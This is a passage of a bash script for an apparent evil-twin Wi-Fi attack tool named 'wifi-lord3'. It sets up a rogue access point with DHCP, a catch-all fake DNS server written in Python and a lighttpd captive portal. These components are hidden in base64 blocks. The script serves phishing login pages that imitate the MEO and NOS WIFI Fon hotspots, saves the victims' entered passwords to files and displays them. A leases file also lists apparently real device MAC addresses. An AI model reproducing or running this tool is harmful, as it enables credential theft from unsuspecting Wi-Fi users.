	killall airodump-ng mdk3 aireplay-ng xterm lighttpd dhcpd fakedns &>$output_device
	if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
		sysctl -w net.ipv4.ip_forward=0 &>$output_device
	fi	
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	sleep 1
	airmon-ng stop "$interface$mon" &> $output_device &
	sleep 1
	ifconfig $interface down &> $output_device &
	sleep 2
	macchanger -p $interface &>$output_device
	sleep 1
 	ifconfig $interface up &> $output_device &
	sleep 2
	service network-manager restart &> $output_device &
	service networking restart &> $output_device &
	service restart networkmanager &> $output_device &
	systemctl start NetworkManager &> $output_device &
	systemctl start NetworkManager.service &> $output_device &
	sleep 2
	systemctl restart NetworkManager.service &> $output_device &
	sleep 1
	clear
}

#force kill all
function force_kill_all {
	sleep 0.25; echo -e -n "\n\n\n"; echo -en "             (kill and restore processes)\n"	
	
	for number in $(seq 0 100)
	do
		sleep 0.04
		ProgressBar ${number} 100
	done
	
	#save passwords
	if [ ! -d $PASSWORDS_DIR ]; then
		mkdir -p $PASSWORDS_DIR 2>/dev/null
	fi
	timestamp=`date +"%Y-%m-%d_%H-%M-%S"`
	cp $DUMP_PATH/page/auth.txt $PASSWORDS_DIR/wifi-lord3_$nameap-$timestamp.txt &>$output_device	
	
	rm -rf $DUMP_PATH/* &>$output_device
	rm -R $DUMP_PATH 2>/dev/null
	killall airodump-ng mdk3 aireplay-ng xterm lighttpd dhcpd fakedns &>$output_device
	if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
		sysctl -w net.ipv4.ip_forward=0 &>$output_device
	fi	
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	sleep 1
	airmon-ng stop "$interface$mon" &> $output_device &
	sleep 1
	ifconfig $interface down &> $output_device &
	sleep 2
	macchanger -p $interface &>$output_device
	sleep 1
 	ifconfig $interface up &> $output_device &
	sleep 2
	service network-manager restart &> $output_device &
	service networking restart &> $output_device &
	service restart networkmanager &> $output_device &
	systemctl start NetworkManager &> $output_device &
	systemctl start NetworkManager.service &> $output_device &
	sleep 2
	systemctl restart NetworkManager.service &> $output_device &
	sleep 1
	clear
	echo ""
	echo ""
	echo -en "Thanks ~ by "$red"sirpedrotavares"
	echo ""
	echo ""
	exit 1
}



# Root files
function rootfiles {

echo "YXV0aG9yaXRhdGl2ZTsKZGVmYXVsdC1sZWFzZS10aW1lIDYwMDsKbWF4LWxlYXNlLXRpbWUgNzIw
MDsKc3VibmV0IDE5Mi4xNjguMS4wIG5ldG1hc2sgMjU1LjI1NS4yNTUuMCB7Cm9wdGlvbiBicm9h
ZGNhc3QtYWRkcmVzcyAxOTIuMTY4LjEuMjU1OwpvcHRpb24gcm91dGVycyAxOTIuMTY4LjEuMTsK
b3B0aW9uIHN1Ym5ldC1tYXNrIDI1NS4yNTUuMjU1LjA7Cm9wdGlvbiBkb21haW4tbmFtZS1zZXJ2
ZXJzIDE5Mi4xNjguMS4xOwpyYW5nZSAxOTIuMTY4LjEuMTAwIDE5Mi4xNjguMS4yNTA7Cn0K" | base64 -d > "$DUMP_PATH/dhcpd.conf"

echo "IyBUaGUgZm9ybWF0IG9mIHRoaXMgZmlsZSBpcyBkb2N1bWVudGVkIGluIHRoZSBkaGNwZC5sZWFz
ZXMoNSkgbWFudWFsIHBhZ2UuCiMgVGhpcyBsZWFzZSBmaWxlIHdhcyB3cml0dGVuIGJ5IGlzYy1k
aGNwLTQuMy41CgojIGF1dGhvcmluZy1ieXRlLW9yZGVyIGVudHJ5IGlzIGdlbmVyYXRlZCwgRE8g
Tk9UIERFTEVURQphdXRob3JpbmctYnl0ZS1vcmRlciBsaXR0bGUtZW5kaWFuOwoKbGVhc2UgMTky
LjE2OC4xLjEwMSB7CiAgc3RhcnRzIDMgMjAxNi8xMS8wMiAxNzo1Mzo1NDsKICBlbmRzIDMgMjAx
Ni8xMS8wMiAxODowMzo1NDsKICB0c3RwIDMgMjAxNi8xMS8wMiAxODowMzo1NDsKICBjbHR0IDMg
MjAxNi8xMS8wMiAxNzo1Mzo1NDsKICBiaW5kaW5nIHN0YXRlIGZyZWU7CiAgaGFyZHdhcmUgZXRo
ZXJuZXQgYzA6Mzg6OTY6MTE6MGU6MjU7CiAgdWlkICJcMDAxXDMwMDhcMjI2XDAyMVwwMTYlIjsK
ICBzZXQgdmVuZG9yLWNsYXNzLWlkZW50aWZpZXIgPSAiTVNGVCA1LjAiOwp9CmxlYXNlIDE5Mi4x
NjguMS4xMzEgewogIHN0YXJ0cyAzIDIwMTYvMTEvMDIgMTg6MDI6Mjc7CiAgZW5kcyAzIDIwMTYv
MTEvMDIgMTg6MTI6Mjc7CiAgdHN0cCAzIDIwMTYvMTEvMDIgMTg6MTI6Mjc7CiAgY2x0dCAzIDIw
MTYvMTEvMDIgMTg6MDI6Mjc7CiAgYmluZGluZyBzdGF0ZSBmcmVlOwogIGhhcmR3YXJlIGV0aGVy
bmV0IGEwOmE4OmNkOmMyOmU5OmJjOwogIHVpZCAiXDAwMVwyNDBcMjUwXDMxNVwzMDJcMzUxXDI3
NCI7CiAgc2V0IHZlbmRvci1jbGFzcy1pZGVudGlmaWVyID0gIk1TRlQgNS4wIjsKfQpsZWFzZSAx
OTIuMTY4LjEuMjE2IHsKICBzdGFydHMgMyAyMDE2LzExLzAyIDE4OjAyOjU0OwogIGVuZHMgMyAy
MDE2LzExLzAyIDE4OjEyOjU0OwogIHRzdHAgMyAyMDE2LzExLzAyIDE4OjEyOjU0OwogIGNsdHQg
MyAyMDE2LzExLzAyIDE4OjAyOjU0OwogIGJpbmRpbmcgc3RhdGUgZnJlZTsKICBoYXJkd2FyZSBl
dGhlcm5ldCAzMDozYTo2NDplYzpmMzo5YzsKICB1aWQgIlwwMDEwOmRcMzU0XDM2M1wyMzQiOwog
IHNldCB2ZW5kb3ItY2xhc3MtaWRlbnRpZmllciA9ICJNU0ZUIDUuMCI7Cn0KbGVhc2UgMTkyLjE2
OC4xLjEwNSB7CiAgc3RhcnRzIDMgMjAxNi8xMS8wMiAxODowMzoxMTsKICBlbmRzIDMgMjAxNi8x
MS8wMiAxODoxMzoxMTsKICB0c3RwIDMgMjAxNi8xMS8wMiAxODoxMzoxMTsKICBjbHR0IDMgMjAx
Ni8xMS8wMiAxODowMzoxMTsKICBiaW5kaW5nIHN0YXRlIGZyZWU7CiAgaGFyZHdhcmUgZXRoZXJu
ZXQgNjA6NTc6MTg6MGU6N2I6YzE7CiAgdWlkICJcMDAxYFdcMDMwXDAxNntcMzAxIjsKICBzZXQg
dmVuZG9yLWNsYXNzLWlkZW50aWZpZXIgPSAiTVNGVCA1LjAiOwp9CmxlYXNlIDE5Mi4xNjguMS4x
ODcgewogIHN0YXJ0cyAzIDIwMTYvMTEvMDIgMTk6NDk6MzA7CiAgZW5kcyAzIDIwMTYvMTEvMDIg
MTk6NTk6MzA7CiAgdHN0cCAzIDIwMTYvMTEvMDIgMTk6NTk6MzA7CiAgY2x0dCAzIDIwMTYvMTEv
MDIgMTk6NDk6MzA7CiAgYmluZGluZyBzdGF0ZSBmcmVlOwogIGhhcmR3YXJlIGV0aGVybmV0IGU0
Ojk4OmQxOjc1OmQxOjMwOwogIHVpZCAiXDAwMVwzNDRcMjMwXDMyMXVcMzIxMCI7CiAgc2V0IHZl
bmRvci1jbGFzcy1pZGVudGlmaWVyID0gIk1TRlQgNS4wIjsKfQpsZWFzZSAxOTIuMTY4LjEuMTE0
IHsKICBzdGFydHMgMyAyMDE2LzExLzAyIDE5OjU0OjMyOwogIGVuZHMgMyAyMDE2LzExLzAyIDIw
OjA0OjMyOwogIHRzdHAgMyAyMDE2LzExLzAyIDIwOjA0OjMyOwogIGNsdHQgMyAyMDE2LzExLzAy
IDE5OjU0OjMyOwogIGJpbmRpbmcgc3RhdGUgZnJlZTsKICBoYXJkd2FyZSBldGhlcm5ldCAzNDoy
MzpiYTphNDpmYzpjNDsKICB1aWQgIlwwMDE0I1wyNzJcMjQ0XDM3NFwzMDQiOwogIHNldCB2ZW5k
b3ItY2xhc3MtaWRlbnRpZmllciA9ICJkaGNwY2QtNS41LjYiOwp9CmxlYXNlIDE5Mi4xNjguMS4x
NzcgewogIHN0YXJ0cyAzIDIwMTYvMTEvMDIgMjA6MzQ6MDQ7CiAgZW5kcyAzIDIwMTYvMTEvMDIg
MjA6NDQ6MDQ7CiAgdHN0cCAzIDIwMTYvMTEvMDIgMjA6NDQ6MDQ7CiAgY2x0dCAzIDIwMTYvMTEv
MDIgMjA6MzQ6MDQ7CiAgYmluZGluZyBzdGF0ZSBmcmVlOwogIGhhcmR3YXJlIGV0aGVybmV0IDBj
OmIzOjE5OjJiOmEwOjMxOwogIHVpZCAiXDAwMVwwMTRcMjYzXDAzMStcMjQwMSI7CiAgc2V0IHZl
bmRvci1jbGFzcy1pZGVudGlmaWVyID0gImRoY3BjZC01LjUuNiI7Cn0KbGVhc2UgMTkyLjE2OC4x
LjE4OSB7CiAgc3RhcnRzIDMgMjAxNi8xMS8wMiAyMToyNTo1OTsKICBlbmRzIDMgMjAxNi8xMS8w
MiAyMTozNTo1OTsKICB0c3RwIDMgMjAxNi8xMS8wMiAyMTozNTo1OTsKICBjbHR0IDMgMjAxNi8x
MS8wMiAyMToyNjowMzsKICBiaW5kaW5nIHN0YXRlIGZyZWU7CiAgaGFyZHdhcmUgZXRoZXJuZXQg
NGM6MjE6ZDA6NTY6N2E6ZmY7CiAgc2V0IHZlbmRvci1jbGFzcy1pZGVudGlmaWVyID0gImRoY3Bj
ZC01LjUuNiI7Cn0KbGVhc2UgMTkyLjE2OC4xLjIwMyB7CiAgc3RhcnRzIDMgMjAxNi8xMS8wMiAy
MToyODoxNzsKICBlbmRzIDMgMjAxNi8xMS8wMiAyMTozODoxNzsKICB0c3RwIDMgMjAxNi8xMS8w
MiAyMTozODoxNzsKICBjbHR0IDMgMjAxNi8xMS8wMiAyMToyODoxNzsKICBiaW5kaW5nIHN0YXRl
IGZyZWU7CiAgaGFyZHdhcmUgZXRoZXJuZXQgMzQ6NGQ6Zjc6MTA6N2E6MmE7CiAgc2V0IHZlbmRv
ci1jbGFzcy1pZGVudGlmaWVyID0gImRoY3BjZC01LjUuNiI7Cn0KbGVhc2UgMTkyLjE2OC4xLjE4
MiB7CiAgc3RhcnRzIDMgMjAxNi8xMS8wMiAyMToyODoyOTsKICBlbmRzIDMgMjAxNi8xMS8wMiAy
MTozODoyOTsKICB0c3RwIDMgMjAxNi8xMS8wMiAyMTozODoyOTsKICBjbHR0IDMgMjAxNi8xMS8w
MiAyMToyODoyOTsKICBiaW5kaW5nIHN0YXRlIGZyZWU7CiAgaGFyZHdhcmUgZXRoZXJuZXQgNGM6
NjY6NDE6NzY6NTE6ODA7CiAgdWlkICJcMDAxTGZBdlFcMjAwIjsKICBzZXQgdmVuZG9yLWNsYXNz
LWlkZW50aWZpZXIgPSAiZGhjcGNkLTUuNS42IjsKfQpsZWFzZSAxOTIuMTY4LjEuMTgxIHsKICBz
dGFydHMgMyAyMDE2LzExLzAyIDIxOjMyOjE3OwogIGVuZHMgMyAyMDE2LzExLzAyIDIxOjQyOjE3
OwogIHRzdHAgMyAyMDE2LzExLzAyIDIxOjQyOjE3OwogIGNsdHQgMyAyMDE2LzExLzAyIDIxOjMy
OjE3OwogIGJpbmRpbmcgc3RhdGUgZnJlZTsKICBoYXJkd2FyZSBldGhlcm5ldCA0MDplMjozMDpj
NjoxMzplNzsKICB1aWQgIlwwMDFAXDM0MjBcMzA2XDAyM1wzNDciOwogIHNldCB2ZW5kb3ItY2xh
c3MtaWRlbnRpZmllciA9ICJNU0ZUIDUuMCI7Cn0KbGVhc2UgMTkyLjE2OC4xLjEzMCB7CiAgc3Rh
cnRzIDMgMjAxNi8xMS8wMiAyMTo0OTowMjsKICBlbmRzIDMgMjAxNi8xMS8wMiAyMTo1OTowMjsK
ICB0c3RwIDMgMjAxNi8xMS8wMiAyMTo1OTowMjsKICBjbHR0IDMgMjAxNi8xMS8wMiAyMTo0OTow
MjsKICBiaW5kaW5nIHN0YXRlIGZyZWU7CiAgaGFyZHdhcmUgZXRoZXJuZXQgYTQ6MzE6MzU6ZDk6
MTM6NTk7CiAgdWlkICJcMDAxXDI0NDE1XDMzMVwwMjNZIjsKfQpsZWFzZSAxOTIuMTY4LjEuMTMy
IHsKICBzdGFydHMgMyAyMDE2LzExLzAyIDIxOjU3OjExOwogIGVuZHMgMyAyMDE2LzExLzAyIDIy
OjA3OjExOwogIHRzdHAgMyAyMDE2LzExLzAyIDIyOjA3OjExOwogIGNsdHQgMyAyMDE2LzExLzAy
IDIxOjU3OjExOwogIGJpbmRpbmcgc3RhdGUgZnJlZTsKICBoYXJkd2FyZSBldGhlcm5ldCAwMDo3
Mzo4ZDpkYTozNTpkYzsKICBzZXQgdmVuZG9yLWNsYXNzLWlkZW50aWZpZXIgPSAiZGhjcGNkLTUu
NS42IjsKfQpsZWFzZSAxOTIuMTY4LjEuMTYwIHsKICBzdGFydHMgMyAyMDE2LzExLzAyIDIxOjU5
OjU1OwogIGVuZHMgMyAyMDE2LzExLzAyIDIyOjA5OjU1OwogIHRzdHAgMyAyMDE2LzExLzAyIDIy
OjA5OjU1OwogIGNsdHQgMyAyMDE2LzExLzAyIDIxOjU5OjU1OwogIGJpbmRpbmcgc3RhdGUgZnJl
ZTsKICBoYXJkd2FyZSBldGhlcm5ldCBmMDo1YTowOTo1Njo5NDphOTsKICB1aWQgIlwwMDFcMzYw
WlwwMTFWXDIyNFwyNTEiOwogIHNldCB2ZW5kb3ItY2xhc3MtaWRlbnRpZmllciA9ICJkaGNwY2Qg
NC4wLjE1IjsKfQpsZWFzZSAxOTIuMTY4LjEuMTAwIHsKICBzdGFydHMgMyAyMDE2LzExLzAyIDIy
OjE5OjI3OwogIGVuZHMgMyAyMDE2LzExLzAyIDIyOjI5OjI3OwogIHRzdHAgMyAyMDE2LzExLzAy
IDIyOjI5OjI3OwogIGNsdHQgMyAyMDE2LzExLzAyIDIyOjE5OjI3OwogIGJpbmRpbmcgc3RhdGUg
ZnJlZTsKICBoYXJkd2FyZSBldGhlcm5ldCBjMDplZTpmYjo0Mzo1MTo3ODsKICB1aWQgIlwwMDFc
MzAwXDM1NlwzNzNDUXgiOwogIHNldCB2ZW5kb3ItY2xhc3MtaWRlbnRpZmllciA9ICJhbmRyb2lk
LWRoY3AtNi4wLjEiOwp9CmxlYXNlIDE5Mi4xNjguMS4xNTMgewogIHN0YXJ0cyAzIDIwMTYvMTEv
MDIgMjI6MzM6NTk7CiAgZW5kcyAzIDIwMTYvMTEvMDIgMjI6NDM6NTk7CiAgY2x0dCAzIDIwMTYv
MTEvMDIgMjI6MzM6NTk7CiAgYmluZGluZyBzdGF0ZSBhY3RpdmU7CiAgbmV4dCBiaW5kaW5nIHN0
YXRlIGZyZWU7CiAgcmV3aW5kIGJpbmRpbmcgc3RhdGUgZnJlZTsKICBoYXJkd2FyZSBldGhlcm5l
dCBlODoxNTowZTo3NDpmZDphZDsKICB1aWQgIlwwMDFcMzUwXDAyNVwwMTZ0XDM3NVwyNTUiOwog
IHNldCB2ZW5kb3ItY2xhc3MtaWRlbnRpZmllciA9ICJNU0ZUIDUuMCI7CiAgY2xpZW50LWhvc3Ru
YW1lICJXaW5kb3dzLVBob25lIjsKfQo=" | base64 -d > "$DUMP_PATH/dhcpd.leases"

echo "aW1wb3J0IHNvY2tldAoKY2xhc3MgRE5TUXVlcnk6CiAgZGVmIF9faW5pdF9fKHNlbGYsIGRhdGEp
OgogICAgc2VsZi5kYXRhPWRhdGEKICAgIHNlbGYuZG9taW5pbz0nJwoKICAgIHRpcG8gPSAob3Jk
KGRhdGFbMl0pID4+IDMpICYgMTUKICAgIGlmIHRpcG8gPT0gMDoKICAgICAgaW5pPTEyCiAgICAg
IGxvbj1vcmQoZGF0YVtpbmldKQogICAgICB3aGlsZSBsb24gIT0gMDoKCXNlbGYuZG9taW5pbys9
ZGF0YVtpbmkrMTppbmkrbG9uKzFdKycuJwoJaW5pKz1sb24rMQoJbG9uPW9yZChkYXRhW2luaV0p
CgogIGRlZiByZXNwdWVzdGEoc2VsZiwgaXApOgogICAgcGFja2V0PScnCiAgICBpZiBzZWxmLmRv
bWluaW86CiAgICAgIHBhY2tldCs9c2VsZi5kYXRhWzoyXSArICJceDgxXHg4MCIKICAgICAgcGFj
a2V0Kz1zZWxmLmRhdGFbNDo2XSArIHNlbGYuZGF0YVs0OjZdICsgJ1x4MDBceDAwXHgwMFx4MDAn
CiAgICAgIHBhY2tldCs9c2VsZi5kYXRhWzEyOl0KICAgICAgcGFja2V0Kz0nXHhjMFx4MGMnCiAg
ICAgIHBhY2tldCs9J1x4MDBceDAxXHgwMFx4MDFceDAwXHgwMFx4MDBceDNjXHgwMFx4MDQnCiAg
ICAgIHBhY2tldCs9c3RyLmpvaW4oJycsbWFwKGxhbWJkYSB4OiBjaHIoaW50KHgpKSwgaXAuc3Bs
aXQoJy4nKSkpCiAgICByZXR1cm4gcGFja2V0CgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgog
IGlwPScxOTIuMTY4LjEuMScKICBwcmludCAncHltaW5pZmFrZURmbHV4YXNzTlM6OiBkb20ucXVl
cnkuIDYwIElOIEEgJXMnICUgaXAKCiAgdWRwcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lO
RVQsIHNvY2tldC5TT0NLX0RHUkFNKQogIHVkcHMuYmluZCgoJycsNTMpKQoKICB0cnk6CiAgICB3
aGlsZSAxOgogICAgICBkYXRhLCBhZGRyID0gdWRwcy5yZWN2ZnJvbSgxMDI0KQogICAgICBwPURO
U1F1ZXJ5KGRhdGEpCiAgICAgIHVkcHMuc2VuZHRvKHAucmVzcHVlc3RhKGlwKSwgYWRkcikKICAg
ICAgcHJpbnQgJ1JlcXVlc3Q6ICVzIC0+ICVzJyAlIChwLmRvbWluaW8sIGlwKQogIGV4Y2VwdCBL
ZXlib2FyZEludGVycnVwdDoKICAgIHByaW50ICdGaW5hbGl6YW5kbycKICAgIHVkcHMuY2xvc2Uo
KQo=" | base64 -d > "$DUMP_PATH/fakedns"

chmod a+x "$DUMP_PATH/fakedns"

echo "c2VydmVyLmRvY3VtZW50LXJvb3QgPSAiL3RtcC93aWZpLWxvcmQzL3BhZ2UvIgoKc2VydmVyLm1v
ZHVsZXMgPSAoCiAgIm1vZF9hY2Nlc3MiLAogICJtb2RfYWxpYXMiLAogICJtb2RfYWNjZXNzbG9n
IiwKICAibW9kX2Zhc3RjZ2kiLAogICJtb2RfcmVkaXJlY3QiLAogICJtb2RfcmV3cml0ZSIKKQoK
ZmFzdGNnaS5zZXJ2ZXIgPSAoICIucGhwIiA9PiAoKAoJCSAgImJpbi1wYXRoIiA9PiAiL3Vzci9i
aW4vcGhwLWNnaSIsCgkJICAic29ja2V0IiA9PiAiL3BocC5zb2NrZXQiCgkJKSkpCgpzZXJ2ZXIu
cG9ydCA9IDgwCnNlcnZlci5waWQtZmlsZSA9ICIvdmFyL3J1bi9saWdodHRwZC5waWQiCiMgc2Vy
dmVyLnVzZXJuYW1lID0gInd3dyIKIyBzZXJ2ZXIuZ3JvdXBuYW1lID0gInd3dyIKCm1pbWV0eXBl
LmFzc2lnbiA9ICgKIi5odG1sIiA9PiAidGV4dC9odG1sIiwKIi5odG0iID0+ICJ0ZXh0L2h0bWwi
LAoiLnR4dCIgPT4gInRleHQvcGxhaW4iLAoiLmpwZyIgPT4gImltYWdlL2pwZWciLAoiLnBuZyIg
PT4gImltYWdlL3BuZyIsCiIuY3NzIiA9PiAidGV4dC9jc3MiCikKCnNlcnZlci5lcnJvci1oYW5k
bGVyLTQwNCA9ICIvIgoKc3RhdGljLWZpbGUuZXhjbHVkZS1leHRlbnNpb25zID0gKCAiLmZjZ2ki
LCAiLnBocCIsICIucmIiLCAifiIsICIuaW5jIiApCmluZGV4LWZpbGUubmFtZXMgPSAoICJpbmRl
eC5odG1sIiApCgoKCiNSZWRpcmVjdCB3d3cuZG9tYWluLmNvbSB0byBkb21haW4uY29tCiRIVFRQ
WyJob3N0Il0gPX4gIl53d3dcLiguKikkIiB7Cgl1cmwucmVkaXJlY3QgPSAoICJeLyguKikiID0+
ICJodHRwOi8vJTEvJDEiICkKCgp9Cgo=" | base64 -d > "$DUMP_PATH/lighttpd.conf"

echo "IyEvYmluL2Jhc2gKCkRVTVBfUEFUSD0iL3RtcC93aWZpLWxvcmQzIgoKZnVuY3Rpb24gY3JlYXRl
ZmlsZXMgewoKCWNhdCAkRFVNUF9QQVRIL2hvc3RzLnR4dCB8IGdyZXAgIkRIQ1BPRkZFUiIgPiAk
RFVNUF9QQVRIL2NsaWVudHMudHh0CgljYXQgJERVTVBfUEFUSC9ob3N0cy50eHQgfCBncmVwICJE
SENQQUNLIiA+PiAkRFVNUF9QQVRIL2NsaWVudHMudHh0CglzZWQgLXIgJy9eLnssNDR9JC9kJyAk
RFVNUF9QQVRIL2NsaWVudHMudHh0ID4gJERVTVBfUEFUSC9maW5hbF9jbGllbnRzLnR4dAoJYXdr
ICd7cHJpbnQgJDMgZWNobyAiICIgJDUgZWNobyAiICIgJDZ9JyAkRFVNUF9QQVRIL2ZpbmFsX2Ns
aWVudHMudHh0ID4gJERVTVBfUEFUSC9jbGllbnRzX3VuaWMudHh0Cglhd2sgJyFzZWVuWyQwXSsr
JyAkRFVNUF9QQVRIL2NsaWVudHNfdW5pYy50eHQgPiAkRFVNUF9QQVRIL2ZpbmFsX2NsaWVudHMx
LnR4dAoJc2VkICcvYXQwL2QnICREVU1QX1BBVEgvZmluYWxfY2xpZW50czEudHh0ID4gJERVTVBf
UEFUSC9maW5hbC50eHQKfQoKZnVuY3Rpb24gcmVhZGZpbGUgewoJVE9UQUxDTElFTlRTPWB3YyAt
bCAkRFVNUF9QQVRIL2ZpbmFsLnR4dCB8IGF3ayAne3ByaW50ICQxfSdgCglUT1RBTFBBU1NXT1JE
Uz1gd2MgLWwgJERVTVBfUEFUSC9wYWdlL2F1dGgudHh0IDI+L2Rldi9udWxsIHwgYXdrICd7cHJp
bnQgJDF9J2AKCQoJZWNobyAtZW4gIlxuIgoJZWNobyAtZSAiXDAzM1sxOzMzbVRvdGFsIGNsaWVu
dHM6IFwwMzNbMTszN20iJFRPVEFMQ0xJRU5UUyIiCgllY2hvIC1lbiAiXG4iCgllY2hvIC1lICJc
MDMzWzE7MzNtVG90YWwgcGFzc3dvcmRzOiBcMDMzWzE7MzdtIiRUT1RBTFBBU1NXT1JEUyIiCgll
Y2hvIC1lbiAiXG4iCgllY2hvIC1lICJcMDMzWzE7MzFtTGlzdCBvZiBwYXNzd29yZHNcMDMzWzE7
MzdtIgoJZWNobyAtZW4gIlxuIgoJY2F0ICIkRFVNUF9QQVRIL3BhZ2UvYXV0aC50eHQiIDI+L2Rl
di9udWxsCgllY2hvIC1lbiAiXG4iCgllY2hvIC1lICJcMDMzWzE7MzFtTGlzdCBvZiBjbGllbnRz
XDAzM1sxOzM3bSIKCWF3ayAne3ByaW50ICQxIGVjaG8gIlx0IiAkMiBlY2hvICJcdCIgJDN9JyAk
RFVNUF9QQVRIL2ZpbmFsLnR4dAp9CgoKd2hpbGUgdHJ1ZTsgZG8KCWNyZWF0ZWZpbGVzCglzbGVl
cCAyCgljbGVhcgoJcmVhZGZpbGUKCXNsZWVwIDIKZG9uZQo=" | base64 -d > "$DUMP_PATH/check_clients.sh"

chmod a+x "$DUMP_PATH/check_clients.sh"

}

##############################################################################################################
#                                                WEB-INTERFACES                                              #
##############################################################################################################
function MEO {
	mkdir $DUMP_PATH/page &> $output_device
	cp  $WORK_DIR/pages/MEO/icons-login-wifi.png $DUMP_PATH/page
	cp  $WORK_DIR/pages/MEO/logo_meowifi.png $DUMP_PATH/page
	cp  $WORK_DIR/pages/MEO/MEO-Wifi-login-cafe-XL.JPG $DUMP_PATH/page
	cp  $WORK_DIR/pages/MEO/index.html $DUMP_PATH/page
	cp  $WORK_DIR/pages/MEO/style.css $DUMP_PATH/page
	cp  $WORK_DIR/pages/MEO/login.php $DUMP_PATH/page	
}

function NOS_WIFI_Fon {
	mkdir $DUMP_PATH/page &> $output_device
	cp  $WORK_DIR/pages/NOS_WIFI_Fon/bg-blackbox.png $DUMP_PATH/page
	cp  $WORK_DIR/pages/NOS_WIFI_Fon/bg-home.jpg $DUMP_PATH/page
	cp  $WORK_DIR/pages/NOS_WIFI_Fon/sprite.png $DUMP_PATH/page
	cp  $WORK_DIR/pages/NOS_WIFI_Fon/main.css $DUMP_PATH/page
	cp  $WORK_DIR/pages/NOS_WIFI_Fon/login.php $DUMP_PATH/page
	cp  $WORK_DIR/pages/NOS_WIFI_Fon/index.html $DUMP_PATH/page
}
##############################################################################################################


##############################################################################################################
#                                                    MAIN                                                    #
##############################################################################################################
#
configfile
gemfile
removeWorkDir; createWorkingDir; createPermanentWorkingDir
#
check_revision_online
#
if [ $DEBUG_MODE = 0 ]; then
	banner
	checkdependences
fi
#
header_wifilord3
#
initial_menu





